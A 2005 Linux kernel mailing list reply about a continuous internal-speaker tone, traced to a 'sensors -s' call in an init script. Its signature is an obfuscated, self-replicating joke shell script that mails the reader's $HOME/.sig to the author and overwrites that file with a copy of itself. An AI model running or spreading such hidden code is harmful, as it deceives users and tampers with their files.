Return-Path: <linux-kernel-owner+willy=40w.ods.org-S932081AbVHRH2K@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S932081AbVHRH2K (ORCPT <rfc822;willy@w.ods.org>);
	Thu, 18 Aug 2005 03:28:10 -0400
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S932098AbVHRH2K
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Thu, 18 Aug 2005 03:28:10 -0400
Received: from grisu.bik-gmbh.de ([217.110.154.194]:33763 "EHLO
	grisu.bik-gmbh.de") by vger.kernel.org with ESMTP id S932081AbVHRH2J
	(ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Thu, 18 Aug 2005 03:28:09 -0400
Message-ID: <430438AB.1010104@hars.de>
Date: Thu, 18 Aug 2005 09:28:43 +0200
From: Florian Hars <florian@hars.de>
User-Agent: Mozilla Thunderbird 1.0.2 (X11/20050404)
X-Accept-Language: en-us, en
MIME-Version: 1.0
To: Denis Vlasenko <vda@ilport.com.ua>
CC: linux-kernel@vger.kernel.org
Subject: Re: 2.6.12.4: Continuous Sound from internal speaker from boot to
 shutdown
References: <43002D8A.70701@hars.de> <200508151018.39232.vda@ilport.com.ua>
In-Reply-To: <200508151018.39232.vda@ilport.com.ua>
Content-Type: text/plain; charset=KOI8-R; format=flowed
Content-Transfer-Encoding: 7bit
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

Denis Vlasenko wrote:
> Sounds like ( ;] ) it's a userspace program or a loaded module.
> boot with init=/bin/sh and then reproduce normal boot manually entering
> relevant commands (you need to be familiar with boot process

Actually, you don't need to unterstand much about the boot process, just
pretend you're /bin/sh and execute whatever is defined in /etc/inittab :-).
So I found the culprit to be a call to /usr/bin/sensors -s in one of the
init scripts. I disabled the script for the time being (no big loss, the
sensors reported complete junk unter 2.6.8, anyway).

>>pcie_portdrv_probe->Dev[005d:10de] has invalid IRQ. Check vendor BIOS
> Output of lspci? lspci -n?

I look at that later, I'm away from the machine right now.

Yours, Florian.
-- 
#!/bin/sh -
set - `type -p $0` 'tr [a-m][n-z]RUXJAKBOZ [n-z][a-m]EH$W/@OBM' fu XUBZRA.fvt\
angher echo;while [ "$5" != "" ];do shift;done;$4 "gbhpu $3;znvy sKunef.qr<$3\
&&frq -a -rc "`$4 "$0"|$1`">$3;rpub 'Jr ner Svtangher bs Obet.'"|$1|`$4 $2|$1`
